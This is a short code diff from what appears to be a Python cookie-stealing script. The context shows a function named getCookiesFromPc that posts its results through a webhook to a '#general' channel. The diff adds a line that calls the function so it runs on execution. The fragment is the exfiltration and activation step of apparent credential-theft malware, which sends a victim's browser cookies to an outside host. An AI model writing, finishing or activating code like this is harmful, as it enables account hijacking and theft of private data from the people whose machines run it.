@@ -25,3 +25,6 @@ def getCookiesFromPc():
             response = webhook.execute()
             print(f"Message sent to #general - Status: {response.status_code}")
             print(f"Response: {response.text}")
+
+# Actually call the function
+getCookiesFromPc()
